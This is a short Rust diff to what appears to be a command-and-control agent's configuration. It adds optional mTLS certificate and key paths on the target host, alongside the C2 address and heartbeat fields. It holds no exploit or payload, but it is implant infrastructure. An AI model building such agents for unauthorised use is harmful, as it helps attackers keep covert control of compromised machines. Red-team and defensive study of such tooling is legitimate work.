@@ -27,16 +27,47 @@ pub struct AgentConfig {
     pub agent_id: u32,
     /// Heartbeat interval in seconds.
     pub heartbeat_interval: u64,
+    /// Optional path to a client TLS certificate (PEM) on the target.
+    /// When set, the agent uses this cert for mTLS authentication.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub cert_path: Option<String>,
+    /// Optional path to a client TLS private key (PEM) on the target.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub key_path: Option<String>,
 }
 
 impl AgentConfig {
     /// Create a new agent configuration.
-    pub fn new(c2_address: String, cert_fingerprint: String, agent_id: u32) -> Self {
+    pub fn new(
+        c2_address: String,
+        cert_fingerprint: String,
+        agent_id: u32,
+    ) -> Self {
         Self {
             c2_address,
             cert_fingerprint,
             agent_id,
-            heartbeat_interval: 30, // default 30 seconds
+            heartbeat_interval: 30,
+            cert_path: None,
+            key_path: None,
+        }
+    }
+
+    /// Build a config with optional mTLS cert/key paths.
+    pub fn with_tls_paths(
+        c2_address: String,
+        cert_fingerprint: String,
+        agent_id: u32,
+        cert_path: Option<String>,
+        key_path: Option<String>,
+    ) -> Self {
+        Self {
+            c2_address,
+            cert_fingerprint,
+            agent_id,
+            heartbeat_interval: 30,
+            cert_path,
+            key_path,
         }
     }
 
